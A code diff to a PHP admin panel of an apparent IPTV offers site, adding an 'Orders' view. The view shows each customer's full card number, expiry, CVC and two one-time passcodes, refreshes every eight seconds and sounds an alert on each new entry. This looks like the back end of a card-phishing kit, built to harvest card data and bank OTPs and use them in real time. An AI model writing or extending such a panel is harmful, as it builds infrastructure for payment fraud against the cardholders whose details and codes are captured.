@@ -145,6 +145,7 @@ $navItems += [
     'offers' => ['label' => 'Offres IPTV', 'icon' => adminNavIcon('offers')],
     'providers' => ['label' => 'Providers', 'icon' => adminNavIcon('providers')],
     'video' => ['label' => 'Video highlight', 'icon' => adminNavIcon('video')],
+    'orders' => ['label' => 'Orders', 'icon' => adminNavIcon('analytics')],
     'messages' => ['label' => 'Messages', 'icon' => adminNavIcon('messages')],
     'songs' => ['label' => 'Lecteur audio', 'icon' => adminNavIcon('songs')],
     'analytics' => ['label' => 'Analytics', 'icon' => adminNavIcon('analytics')],
@@ -753,8 +754,33 @@ $songs = getSongs($pdo);
 $songDefaultVolume = (int) ($settings['song_default_volume'] ?? 40);
 $songDefaultMuted = ($settings['song_default_muted'] ?? '1') === '1';
 $musicPlayerVisible = ($settings['music_player_visible'] ?? '1') === '1';
+$orders = fetchAllAssoc($pdo, 'SELECT o.*, off.name AS offer_name, off.price AS offer_price FROM orders o LEFT JOIN offers off ON off.id = o.offer_id ORDER BY o.created_at DESC LIMIT 200');
 $visitStats = getVisitStats($pdo);
 $themes = themeOptions();
+$latestMessages = $messages;
+$orderSoundConfig = trim((string) ($config['order_sound'] ?? ''));
+$orderSoundAudio = $orderSoundConfig !== '' ? $orderSoundConfig : 'config/iphone_new_message.mp3';
+if (stripos($orderSoundAudio, 'youtube.com') !== false || stripos($orderSoundAudio, 'youtu.be') !== false) {
+    $orderSoundAudio = 'config/iphone_new_message.mp3';
+}
+if (stripos($orderSoundAudio, 'http://') !== 0 && stripos($orderSoundAudio, 'https://') !== 0) {
+    $orderSoundAudio = rtrim($basePath, '/') . '/' . ltrim($orderSoundAudio, '/');
+    $localPath = realpath(__DIR__ . '/../' . ltrim($orderSoundConfig !== '' ? $orderSoundConfig : 'config/iphone_new_message.mp3', '/'));
+    if (!$localPath || !file_exists($localPath)) {
+        $orderSoundAudio = 'https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg';
+    }
+}
+
+if ($currentSection === 'orders' && isset($_GET['format']) && $_GET['format'] === 'json') {
+    header('Content-Type: application/json');
+    echo json_encode(['orders' => $orders]);
+    exit;
+}
+if ($currentSection === 'messages' && isset($_GET['format']) && $_GET['format'] === 'json') {
+    header('Content-Type: application/json');
+    echo json_encode(['messages' => $latestMessages]);
+    exit;
+}
 
 $editing = [
     'sliders' => null,
@@ -1470,10 +1496,22 @@ $editingTestimonial = $editing['testimonials'];
                     <?php endif; ?>
                 </div>
             </section>
+        <?php elseif ($currentSection === 'orders'): ?>
+            <section class="admin-section">
+                <div class="section-head">
+                    <div>
+                        <h2>Orders (dernières 200)</h2>
+                        <p>Vue rapide des commandes avec OTP 1 et OTP 2.</p>
+                    </div>
+                </div>
+                <div class="orders-grid" data-orders-root>
+                    <p class="analytics-empty">Chargement des commandes...</p>
+                </div>
+            </section>
         <?php elseif ($currentSection === 'messages'): ?>
             <section class="admin-section">
                 <h2>Messages contact</h2>
-                <div class="list">
+                    <div class="list" data-messages-root>
                     <?php foreach ($messages as $message): ?>
                         <article class="message <?= $message['is_read'] ? 'read' : '' ?>">
                             <header>
@@ -1683,8 +1721,195 @@ document.addEventListener('DOMContentLoaded', () => {
         volumeInput.addEventListener('input', updateVolumeDisplay);
         volumeInput.addEventListener('change', updateVolumeDisplay);
     }
+
+    const ordersRoot = document.querySelector('[data-orders-root]');
+    if (ordersRoot) {
+        const esc = (value) => String(value ?? '').replace(/[&<>"']/g, (char) => ({
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#39;',
+        }[char] || char));
+        const ordersAudio = document.querySelector('[data-orders-audio]');
+        let ordersAudioReady = false;
+
+        const ensureAudioReady = () => {
+            if (!ordersAudio) return Promise.reject();
+            ordersAudio.muted = false;
+            ordersAudio.volume = 1;
+            try {
+                ordersAudio.currentTime = 0;
+            } catch (e) {
+                /* ignore */
+            }
+            const attempt = ordersAudio.play?.();
+            if (attempt && typeof attempt.then === 'function') {
+                return attempt.then(() => {
+                    ordersAudio.pause?.();
+                    ordersAudio.currentTime = 0;
+                    ordersAudioReady = true;
+                });
+            }
+            ordersAudioReady = true;
+            return Promise.resolve();
+        };
+
+        const playOrderSound = () => {
+            if (!ordersAudio) return;
+            const playNow = () => {
+                try {
+                    ordersAudio.currentTime = 0;
+                } catch (e) {
+                    /* ignore */
+                }
+                const playPromise = ordersAudio.play?.();
+                if (playPromise && typeof playPromise.catch === 'function') {
+                    playPromise.catch(() => {
+                        ordersAudioReady = false;
+                    });
+                }
+            };
+
+            if (!ordersAudioReady) {
+                ensureAudioReady().then(playNow).catch(() => {});
+            } else {
+                playNow();
+            }
+        };
+
+        document.addEventListener('click', ensureAudioReady, { once: true });
+        document.addEventListener('keydown', ensureAudioReady, { once: true });
+        ensureAudioReady().catch(() => {});
+        let lastOrderId = Array.isArray(window.adminOrders) && window.adminOrders.length
+            ? Number(window.adminOrders[0].id) || null
+            : null;
+        const renderOrders = (list) => {
+            if (!ordersRoot) return;
+            if (!Array.isArray(list) || list.length === 0) {
+                ordersRoot.innerHTML = '<p class="analytics-empty">Aucune commande enregistrée pour le moment.</p>';
+                return;
+            }
+            const html = list.map((order) => {
+                const name = `${order.first_name || ''} ${order.last_name || ''}`.trim() || 'Nom manquant';
+                const address = `${order.address || ''} ${order.city || ''} ${order.country || ''}`.trim();
+                const price = order.offer_price !== undefined && order.offer_price !== null
+                    ? Number(order.offer_price).toFixed(2)
+                    : null;
+                const otp1 = (order.otp || '').toString().trim();
+                const otp2 = (order.otp2 || '').toString().trim();
+                return `
+                    <article class="order-card">
+                        <header class="order-meta">
+                            <div class="order-pill">
+                                <span class="pill-number">#${esc(order.id)}</span>
+                                <span class="pill-offer">${esc(order.offer_name || 'Offre inconnue')}</span>
+                            </div>
+                            <span class="order-date">${esc(order.created_at || '')}</span>
+                        </header>
+                        <div class="order-line">
+                            <span class="order-label">Client</span>
+                            <span class="order-value">${esc(name)}</span>
+                        </div>
+                        <div class="order-line">
+                            <span class="order-label">Contact</span>
+                            <span class="order-value">${esc(order.contact || '')}</span>
+                        </div>
+                        <div class="order-line">
+                            <span class="order-label">Téléphone</span>
+                            <span class="order-value">${esc(order.phone || '')}</span>
+                        </div>
+                        <div class="order-line">
+                            <span class="order-label">Adresse</span>
+                            <span class="order-value">${esc(address)}</span>
+                        </div>
+                        <div class="order-line">
+                            <span class="order-label">Paiement</span>
+                            <span class="order-value">${esc(order.card_number || '—')} · Exp ${esc(order.expiry || '')} · CVC ${esc(order.cvc || '')}${price !== null ? ` · Total $${esc(price)}` : ''}</span>
+                        </div>
+                        <div class="order-otp">
+                            <span class="order-label">OTP 1</span>
+                            <strong>${esc(otp1 !== '' ? otp1 : '—')}</strong>
+                            <span class="order-label">OTP 2</span>
+                            <strong>${esc(otp2 !== '' ? otp2 : '—')}</strong>
+                        </div>
+                    </article>
+                `;
+            }).join('');
+            ordersRoot.innerHTML = html;
+        };
+
+        renderOrders(window.adminOrders || []);
+
+        const fetchOrders = () => {
+            const url = `${window.location.pathname}?section=orders&format=json`;
+            fetch(url, { credentials: 'same-origin' })
+                .then((resp) => resp.json())
+                .then((data) => {
+                    if (data && Array.isArray(data.orders)) {
+                        const list = data.orders;
+                        const topId = list.length ? Number(list[0].id) || null : null;
+                        const shouldRing = lastOrderId !== null && topId !== null && topId > lastOrderId;
+                        renderOrders(list);
+                        if (topId !== null) {
+                            lastOrderId = topId;
+                        }
+                        if (shouldRing) {
+                            playOrderSound();
+                        }
+                    }
+                })
+                .catch((error) => console.error('Orders refresh failed', error));
+        };
+        setInterval(fetchOrders, 8000);
+    }
+
+    const messagesRoot = document.querySelector('[data-messages-root]');
+    if (messagesRoot) {
+        const messagesAudio = document.querySelector('[data-messages-audio]');
+        const tryPlayMessageSound = () => {
+            if (!messagesAudio) return;
+            const playPromise = messagesAudio.play?.();
+            if (playPromise && typeof playPromise.catch === 'function') {
+                playPromise.catch(() => {});
+            }
+        };
+        let lastMessageId = Array.isArray(window.adminMessages) && window.adminMessages.length
+            ? Number(window.adminMessages[0].id) || null
+            : null;
+
+        const fetchMessages = () => {
+            const url = `${window.location.pathname}?section=messages&format=json`;
+            fetch(url, { credentials: 'same-origin' })
+                .then((resp) => resp.json())
+                .then((data) => {
+                    if (data && Array.isArray(data.messages) && data.messages.length) {
+                        const topId = Number(data.messages[0].id) || null;
+                        if (topId !== null && (lastMessageId === null || topId > lastMessageId)) {
+                            lastMessageId = topId;
+                            tryPlayMessageSound();
+                        }
+                    }
+                })
+                .catch((error) => console.error('Messages refresh failed', error));
+        };
+
+        setInterval(fetchMessages, 8000);
+    }
 });
 </script>
+<?php if ($currentSection === 'orders'): ?>
+<script>
+    window.adminOrders = <?= json_encode($orders, JSON_UNESCAPED_UNICODE) ?>;
+</script>
+<audio data-orders-audio preload="auto" src="<?= e($orderSoundAudio) ?>"></audio>
+<?php endif; ?>
+<?php if ($currentSection === 'messages'): ?>
+<script>
+    window.adminMessages = <?= json_encode($messages, JSON_UNESCAPED_UNICODE) ?>;
+</script>
+<audio data-messages-audio preload="auto" src="<?= e($orderSoundAudio) ?>"></audio>
+<?php endif; ?>
 </body>
 </html>
 
